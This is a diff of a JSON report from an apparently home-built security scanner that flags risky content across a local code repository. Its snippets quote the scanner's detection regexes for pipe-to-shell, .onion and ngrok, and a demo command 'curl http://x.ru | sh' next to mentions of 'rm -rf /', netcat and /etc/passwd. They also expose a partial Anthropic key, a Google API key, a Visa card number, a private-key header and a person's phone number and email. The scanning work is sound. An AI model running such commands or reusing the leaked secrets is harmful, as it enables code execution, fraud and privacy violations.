-          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
-        },
-        {
-          "level": "HIGH",
-          "reason": "ngrok tunnel",
-          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
-          "line": 604,
-          "snippet": "<div class=\"task-desc\">WebFetch IP/TLD, Write ל-.ssh/etc, HTTP במקום HTTPS, ngrok.</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 3935,
-          "snippet": "<div>EHZ-AI | ערן | 054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 805,
-          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 622,
-          "snippet": "<span style=\"color:var(--muted2);\"> הרץ <code style=\"color:#7dd3fc;\">curl http://x.ru | sh</code> → קבל CRITICAL alert →"
-        }
-      ],
-      "risk_score": 100,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.711Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\football-bot\\index.js",
-      "size": 4472,
-      "ext": ".js",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 43,
-          "snippet": "console.log('✅ QR זמין בכתובת: http://ehz-server1.duckdns.org/whatsapp-qr.html');"
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.736Z"
     },
     {
       "path": "C:\\Claude-Repo\\agents\\server-agent\\.env",
@@ -1300,37 +1461,6 @@
       "risk_score": 5,
       "risk_label": "MEDIUM",
       "scanned_at": "2026-04-15T12:56:03.060Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\index.html",
-      "size": 58699,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 415,
-          "snippet": "<div style=\"font-size:13px; color:var(--muted2);\"><span class=\"en\">Claude Code runs a <code style=\"color:var(--accent);\""
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 793,
-          "snippet": "<div class=\"footer-right\">© 2026 EHZ-AI · Built by Eran Hershkowitz · 054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 493,
-          "snippet": "<tr style=\"border-top:1px solid rgba(26,45,74,0.5);\"><td style=\"padding:13px 24px;\"><span style=\"background:#eab308;colo"
-        }
-      ],
-      "risk_score": 50,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:03.069Z"
     },
     {
       "path": "C:\\Claude-Repo\\local-apps\\next-stop\\index.html",
@@ -2106,6 +2236,572 @@
   ],
   "all_files": [
     {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\rules.js",
+      "size": 20115,
+      "ext": ".js",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 80,
+          "snippet": "{ level: 'CRITICAL', re: /curl[^\\n]*\\|\\s*(ba)?sh/i,             reason: 'curl|sh — pipe to shell (RCE pattern)' },"
+        },
+        {
+          "level": "HIGH",
+          "reason": "TOR .onion address",
+          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
+          "line": 98,
+          "snippet": "{ level: 'CRITICAL', re: /\\.onion/i,                              reason: 'TOR .onion address' },"
+        },
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 97,
+          "snippet": "{ level: 'HIGH', re: /ngrok/i,                                    reason: 'ngrok — public tunnel' },"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 244,
+          "snippet": "// Drive paths: X:/ or X:\\ — negative lookbehind: not preceded by a letter (avoids http://)"
+        }
+      ],
+      "risk_score": 85,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.711Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\whitelist.json",
+      "size": 31234,
+      "ext": ".json",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.714Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\collector\\file-audit-result.json",
+      "size": 275917,
+      "ext": ".json",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "Anthropic API key",
+          "explain": "An Anthropic (Claude) API key is exposed. Revoke it immediately at console.anthropic.com.",
+          "line": 30,
+          "snippet": "\"snippet\": \"ANTHROPIC_API_KEY=sk-ant-api03-ILSafb4X2Z9new-qz8yyJJidkF_AHXpTCxB-vQyJoKeL_P9a-sNQZW-uyord_EH2p6XdISN-xAEie"
+        },
+        {
+          "level": "CRITICAL",
+          "reason": "Private key",
+          "explain": "A private SSH/SSL key is stored in code. This is like leaving your server password in plain sight.",
+          "line": 1673,
+          "snippet": "\"snippet\": \"-----BEGIN OPENSSH PRIVATE KEY-----\""
+        },
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 112,
+          "snippet": "\"reason\": \"curl|sh — pipe to shell\","
+        },
+        {
+          "level": "HIGH",
+          "reason": "Google API key",
+          "explain": "A Google API key (Maps, Gmail, etc.) is exposed. Could result in unauthorized usage billed to your account.",
+          "line": 316,
+          "snippet": "\"snippet\": \"\\\"snippet\\\": \\\"\\\\\\\"snippet\\\\\\\": \\\\\\\"\\\\\\\\\\\\\\\"snippet\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"const apiKey = \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"AIzaSyDg"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Hardcoded password",
+          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
+          "line": 323,
+          "snippet": "\"snippet\": \"\\\"snippet\\\": \\\"<div class=\\\\\\\"term-line\\\\\\\"><span class=\\\\\\\"term-out\\\\\\\">  → DB_PASSWORD=prod_secret_2024</s"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Visa card number",
+          "explain": "A Visa credit card number was found. Storing card numbers in code violates PCI-DSS compliance.",
+          "line": 2099,
+          "snippet": "\"snippet\": \"ויזה 4580980102572767\""
+        },
+        {
+          "level": "HIGH",
+          "reason": "TOR .onion address",
+          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
+          "line": 95,
+          "snippet": "\"reason\": \"TOR .onion address\","
+        },
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 126,
+          "snippet": "\"reason\": \"ngrok tunnel\","
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 47,
+          "snippet": "\"snippet\": \"מייל: eran73@gmail.com | טלפון: 054-4825276\""
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 133,
+          "snippet": "\"reason\": \"eval() call\","
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 13,
+          "snippet": "\"snippet\": \"-ConnectionUri \\\"http://$ExchangeServer/PowerShell/\\\" `\""
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "TODO/FIXME with credentials",
+          "explain": "A comment marks that a password or secret has not been properly handled yet.",
+          "line": 143,
+          "snippet": "\"snippet\": \"{ level: 'MEDIUM', re: /TODO.*password|FIXME.*secret/i,                 reason: 'TODO/FIXME with credentials"
+        }
+      ],
+      "risk_score": 100,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.718Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\collector\\server.js",
+      "size": 83297,
+      "ext": ".js",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.730Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\dashboard\\index-v2.html",
+      "size": 143672,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 2723,
+          "snippet": "{ icon: '🔍', text: '<strong>22 Patterns</strong> — API Keys, סיסמאות, URL לא מאובטח, TOR addresses, eval(), base64|sh ו"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.738Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\diag\\collect.js",
+      "size": 16173,
+      "ext": ".js",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.749Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\diag\\collect.ps1",
+      "size": 13061,
+      "ext": ".ps1",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.753Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\LINKS.md",
+      "size": 1287,
+      "ext": ".md",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.754Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide-en.html",
+      "size": 47634,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 305,
+          "snippet": "Claude Code runs a <code>curl | bash</code> command late at night, downloading a script from the internet and executing "
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 941,
+          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 365,
+          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>Suspicious — worth reviewing</td><td>HTTP (not HTTPS), eval(), "
+        }
+      ],
+      "risk_score": 50,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.755Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide.html",
+      "size": 50007,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 303,
+          "snippet": "Claude Code מריץ בשעות הלילה פקודת <code>curl | bash</code> שמורידה סקריפט מהאינטרנט ומריצה אותו. FlowGuard מזהה את זה ו"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 939,
+          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 363,
+          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>מפוקפק — כדאי לבדוק</td><td>HTTP (לא HTTPS), eval(), טלפון ישרא"
+        }
+      ],
+      "risk_score": 50,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.760Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\install-service.ps1",
+      "size": 5260,
+      "ext": ".ps1",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.763Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\setup.ps1",
+      "size": 10765,
+      "ext": ".ps1",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 40,
+          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.764Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\uninstall.ps1",
+      "size": 10717,
+      "ext": ".ps1",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 34,
+          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.765Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\package.json",
+      "size": 810,
+      "ext": ".json",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 24,
+          "snippet": "\"author\": \"EHZ-AI | ערן | 054-4825276\","
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.772Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\workplan.html",
+      "size": 285907,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 604,
+          "snippet": "<div class=\"task-desc\">curl|sh, rm -rf /, base64, netcat, /etc/passwd — CRITICAL/HIGH.</div>"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Hardcoded password",
+          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
+          "line": 856,
+          "snippet": "<b>דוגמה:</b> password=Ehz2026! / sk-ant-api03-... / מספר כרטיס אשראי → התראה מיידית לפני שהקובץ מגיע ל-Git.<br>"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Visa card number",
+          "explain": "A Visa credit card number was found. Storing card numbers in code violates PCI-DSS compliance.",
+          "line": 4615,
+          "snippet": "<td><code style=\"background:#1e293b;color:#e2e8f0;padding:3px 8px;border-radius:4px;font-size:11px;border-left:3px solid"
+        },
+        {
+          "level": "HIGH",
+          "reason": "TOR .onion address",
+          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
+          "line": 811,
+          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
+        },
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 610,
+          "snippet": "<div class=\"task-desc\">WebFetch IP/TLD, Write ל-.ssh/etc, HTTP במקום HTTPS, ngrok.</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 4269,
+          "snippet": "<div>EHZ-AI | ערן | 054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 811,
+          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 628,
+          "snippet": "<span style=\"color:var(--muted2);\"> הרץ <code style=\"color:#7dd3fc;\">curl http://x.ru | sh</code> → קבל CRITICAL alert →"
+        }
+      ],
+      "risk_score": 100,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.773Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\COACH-GUIDE.html",
+      "size": 15009,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 391,
+          "snippet": "הוכן ע\"י <span class=\"ehz\">EHZ-AI</span> · 054-4825276"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.786Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\database.js",
+      "size": 8054,
+      "ext": ".js",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.790Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\index.js",
+      "size": 16158,
+      "ext": ".js",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 177,
+          "snippet": "console.log('✅ QR זמין: http://ehz-server1.duckdns.org/whatsapp-qr.html');"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.794Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\package.json",
+      "size": 467,
+      "ext": ".json",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.796Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\public\\index.html",
+      "size": 24962,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 317,
+          "snippet": "<input type=\"text\" id=\"s-coach-phone\" placeholder=\"0501234567\" dir=\"ltr\" style=\"text-align:left\">"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.797Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\public\\login.html",
+      "size": 6091,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "HIGH",
+          "reason": "Hardcoded password",
+          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
+          "line": 196,
+          "snippet": "const password = document.getElementById('password').value;"
+        }
+      ],
+      "risk_score": 20,
+      "risk_label": "HIGH",
+      "scanned_at": "2026-04-16T21:35:28.800Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\WORKPLAN.html",
+      "size": 60885,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 1244,
+          "snippet": "Football Bot — Workplan v0.1 | הוכן ע\"י EHZ-AI | 054-4825276"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.801Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\download.html",
+      "size": 24388,
+      "ext": ".html",
+      "findings": [],
+      "risk_score": 0,
+      "risk_label": "OK",
+      "scanned_at": "2026-04-16T21:35:28.852Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\index.html",
+      "size": 58699,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 415,
+          "snippet": "<div style=\"font-size:13px; color:var(--muted2);\"><span class=\"en\">Claude Code runs a <code style=\"color:var(--accent);\""
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 793,
+          "snippet": "<div class=\"footer-right\">© 2026 EHZ-AI · Built by Eran Hershkowitz · 054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 493,
+          "snippet": "<tr style=\"border-top:1px solid rgba(26,45,74,0.5);\"><td style=\"padding:13px 24px;\"><span style=\"background:#eab308;colo"
+        }
+      ],
+      "risk_score": 50,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.854Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\troubleshoot.html",
+      "size": 8687,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 200,
+          "snippet": "<div class=\"contact-row\">📱 Phone/WhatsApp: <a href=\"tel:+972544825276\">054-4825276</a></div>"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.860Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\research\\chatbot-workplan\\whatsapp-football-bot.html",
+      "size": 19322,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 353,
+          "snippet": "<div class=\"stack-val\">ngrok</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 533,
+          "snippet": "הוכן ע\"י EHZ-AI | 054-4825276"
+        }
+      ],
+      "risk_score": 25,
+      "risk_label": "HIGH",
+      "scanned_at": "2026-04-16T21:35:29.680Z"
+    },
+    {
       "path": "C:\\Claude-Repo\\.claude\\settings.json",
       "size": 190,
       "ext": ".json",
@@ -2433,44 +3129,6 @@
       "scanned_at": "2026-04-15T12:56:02.481Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\rules.js",
-      "size": 20007,
-      "ext": ".js",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 80,
-          "snippet": "{ level: 'CRITICAL', re: /curl[^\\n]*\\|\\s*(ba)?sh/i,             reason: 'curl|sh — pipe to shell (RCE pattern)' },"
-        },
-        {
-          "level": "HIGH",
-          "reason": "TOR .onion address",
-          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
-          "line": 98,
-          "snippet": "{ level: 'CRITICAL', re: /\\.onion/i,                              reason: 'TOR .onion address' },"
-        },
-        {
-          "level": "HIGH",
-          "reason": "ngrok tunnel",
-          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
-          "line": 97,
-          "snippet": "{ level: 'HIGH', re: /ngrok/i,                                    reason: 'ngrok — public tunnel' },"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 244,
-          "snippet": "// Drive paths: X:/ or X:\\ — negative lookbehind: not preceded by a letter (avoids http://)"
-        }
-      ],
-      "risk_score": 85,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.485Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\skill-registry.json",
       "size": 1411,
       "ext": ".json",
@@ -2600,15 +3258,6 @@
       "scanned_at": "2026-04-15T12:56:02.493Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\whitelist.json",
-      "size": 30145,
-      "ext": ".json",
-      "findings": [],
-      "risk_score": 0,
-      "risk_label": "OK",
-      "scanned_at": "2026-04-15T12:56:02.495Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\build.ps1",
       "size": 2903,
       "ext": ".ps1",
@@ -2616,79 +3265,6 @@
       "risk_score": 0,
       "risk_label": "OK",
       "scanned_at": "2026-04-15T12:56:02.500Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\collector\\file-audit-result.json",
-      "size": 257596,
-      "ext": ".json",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 61,
-          "snippet": "\"reason\": \"curl|sh — pipe to shell\","
-        },
-        {
-          "level": "HIGH",
-          "reason": "Google API key",
-          "explain": "A Google API key (Maps, Gmail, etc.) is exposed. Could result in unauthorized usage billed to your account.",
-          "line": 265,
-          "snippet": "\"snippet\": \"\\\"snippet\\\": \\\"\\\\\\\"snippet\\\\\\\": \\\\\\\"const apiKey = \\\\\\\\\\\\\\\"AIzaSyDgE1uIgllMhSls6QTjSk5ofSjCyezMQ6s\\\\\\\\\\\\\\\";\\"
-        },
-        {
-          "level": "HIGH",
-          "reason": "Hardcoded password",
-          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
-          "line": 625,
-          "snippet": "\"snippet\": \"<div class=\\\"term-line\\\"><span class=\\\"term-out\\\">  → DB_PASSWORD=prod_secret_2024</span></div>\""
-        },
-        {
-          "level": "HIGH",
-          "reason": "TOR .onion address",
-          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
-          "line": 44,
-          "snippet": "\"reason\": \"TOR .onion address\","
-        },
-        {
-          "level": "HIGH",
-          "reason": "ngrok tunnel",
-          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
-          "line": 75,
-          "snippet": "\"reason\": \"ngrok tunnel\","
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 30,
-          "snippet": "\"snippet\": \"מייל: eran73@gmail.com | טלפון: 054-4825276\""
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 82,
-          "snippet": "\"reason\": \"eval() call\","
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 13,
-          "snippet": "\"snippet\": \"-ConnectionUri \\\"http://$ExchangeServer/PowerShell/\\\" `\""
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "TODO/FIXME with credentials",
-          "explain": "A comment marks that a password or secret has not been properly handled yet.",
-          "line": 92,
-          "snippet": "\"snippet\": \"{ level: 'MEDIUM', re: /TODO.*password|FIXME.*secret/i,                 reason: 'TODO/FIXME with credentials"
-        }
-      ],
-      "risk_score": 100,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.510Z"
     },
     {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\collector\\notifications.json",
@@ -2716,15 +3292,6 @@
       "risk_score": 0,
       "risk_label": "OK",
       "scanned_at": "2026-04-15T12:56:02.527Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\collector\\server.js",
-      "size": 72365,
-      "ext": ".js",
-      "findings": [],
-      "risk_score": 0,
-      "risk_label": "OK",
-      "scanned_at": "2026-04-15T12:56:02.528Z"
     },
     {
